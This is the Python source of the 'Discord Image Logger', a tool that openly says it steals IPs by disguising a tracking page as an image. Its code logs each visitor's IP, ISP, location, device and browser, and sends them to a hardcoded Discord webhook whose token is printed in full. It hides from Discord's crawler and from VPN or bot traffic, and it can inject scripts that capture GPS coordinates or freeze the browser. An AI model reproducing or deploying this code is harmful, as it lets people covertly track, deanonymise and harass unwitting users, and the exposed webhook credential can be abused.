
# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1335092637803216906/nAFMCFkvxwAeZ9fd4lwlHv7II0vMDkjUwrChJ8x8_8KCJXRzutQlzSvgt-WQpdiSZm7j",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
